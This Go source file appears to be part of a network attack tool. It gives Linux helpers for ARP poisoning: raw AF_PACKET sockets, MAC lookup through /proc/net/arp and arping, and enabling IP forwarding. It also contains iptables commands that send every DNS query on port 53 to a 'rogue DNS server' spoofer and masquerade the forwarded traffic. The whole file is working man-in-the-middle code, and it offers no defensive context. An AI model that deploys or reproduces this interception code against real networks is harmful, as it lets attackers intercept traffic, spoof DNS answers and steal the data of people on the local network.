//go:build linux

package dns

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

// Linux-specific raw socket operations for ARP poisoning

// openRawSocket opens a raw AF_PACKET socket for sending raw Ethernet frames
func openRawSocket(ifaceIndex int) (int, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ARP)))
	if err != nil {
		return -1, fmt.Errorf("socket() failed (requires root/CAP_NET_RAW): %w", err)
	}
	return fd, nil
}

// closeRawSocket closes the raw socket
func closeRawSocket(fd int) {
	syscall.Close(fd)
}

// sendOnSocket sends a raw packet on the given socket
func sendOnSocket(fd int, ifaceIndex int, packet []byte) error {
	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ARP),
		Ifindex:  ifaceIndex,
	}
	return syscall.Sendto(fd, packet, 0, &addr)
}

// htons converts a uint16 from host byte order to network byte order
func htons(v uint16) uint16 {
	return (v<<8)&0xff00 | (v>>8)&0xff
}

// getARPEntry reads the system ARP table to find a MAC for the given IP
func getARPEntry(ip net.IP) (net.HardwareAddr, error) {
	f, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	scanner.Scan() // Skip header line

	targetIP := ip.String()
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) >= 4 && fields[0] == targetIP {
			mac, err := net.ParseMAC(fields[3])
			if err != nil {
				return nil, err
			}
			// Skip incomplete entries (00:00:00:00:00:00)
			if mac.String() == "00:00:00:00:00:00" {
				continue
			}
			return mac, nil
		}
	}

	return nil, fmt.Errorf("no ARP entry for %s", targetIP)
}

// triggerARPResolution sends a ping to force ARP resolution
func triggerARPResolution(ip net.IP) {
	cmd := exec.Command("ping", "-c", "1", "-W", "1", ip.String())
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Run()
}

// arpingResolve uses the arping tool to directly resolve a MAC address.
// This is more reliable than ping+ARP-cache because arping sends a raw
// ARP request and parses the reply directly.
func arpingResolve(ip net.IP, iface string) (net.HardwareAddr, error) {
	// Try arping (most distros have it)
	cmd := exec.Command("arping", "-c", "2", "-w", "3", "-I", iface, ip.String())
	output, err := cmd.CombinedOutput()
	if err != nil {
		// Try the iputils variant (different flag syntax)
		cmd = exec.Command("arping", "-c", "2", "-W", "3", "-I", iface, ip.String())
		output, err = cmd.CombinedOutput()
		if err != nil {
			return nil, fmt.Errorf("arping not available or failed: %w", err)
		}
	}

	// Parse output for MAC address pattern like [aa:bb:cc:dd:ee:ff]
	outStr := string(output)
	for _, line := range strings.Split(outStr, "\n") {
		// Look for lines containing a MAC address in brackets
		start := strings.Index(line, "[")
		end := strings.Index(line, "]")
		if start >= 0 && end > start {
			macStr := line[start+1 : end]
			mac, err := net.ParseMAC(macStr)
			if err == nil {
				return mac, nil
			}
		}
	}

	return nil, fmt.Errorf("arping got no reply from %s", ip)
}

// readARPTable reads all entries from /proc/net/arp and returns a map of IP → MAC
func readARPTable() (map[string]net.HardwareAddr, error) {
	f, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	defer f.Close()

	entries := make(map[string]net.HardwareAddr)
	scanner := bufio.NewScanner(f)
	scanner.Scan() // skip header

	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 4 {
			continue
		}
		mac, err := net.ParseMAC(fields[3])
		if err != nil || mac.String() == "00:00:00:00:00:00" {
			continue
		}
		entries[fields[0]] = mac
	}

	return entries, nil
}

func EnableIPForwarding() error {
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
}

// disableIPForwarding disables IP forwarding
func DisableIPForwarding() error {
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0"), 0644)
}

// setupIPTables configures iptables to redirect DNS traffic (port 53) to our
// rogue DNS server, while forwarding all other traffic normally
func SetupIPTables(listenPort int) error {
	commands := [][]string{
		// Redirect incoming DNS (UDP 53) to our spoofer
		{"iptables", "-t", "nat", "-A", "PREROUTING", "-p", "udp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		// Redirect incoming DNS (TCP 53) to our spoofer
		{"iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		// Allow forwarding
		{"iptables", "-A", "FORWARD", "-j", "ACCEPT"},
		// NAT outgoing traffic
		{"iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"},
	}

	for _, args := range commands {
		cmd := exec.Command(args[0], args[1:]...)
		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("iptables command failed: %s: %w", string(output), err)
		}
	}

	return nil
}

// CleanupIPTables removes the iptables rules we added
func CleanupIPTables(listenPort int) {
	commands := [][]string{
		{"iptables", "-t", "nat", "-D", "PREROUTING", "-p", "udp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		{"iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "53",
			"-j", "REDIRECT", "--to-port", fmt.Sprintf("%d", listenPort)},
		{"iptables", "-D", "FORWARD", "-j", "ACCEPT"},
		{"iptables", "-t", "nat", "-D", "POSTROUTING", "-j", "MASQUERADE"},
	}

	for _, args := range commands {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Run() // Ignore errors during cleanup
	}
}

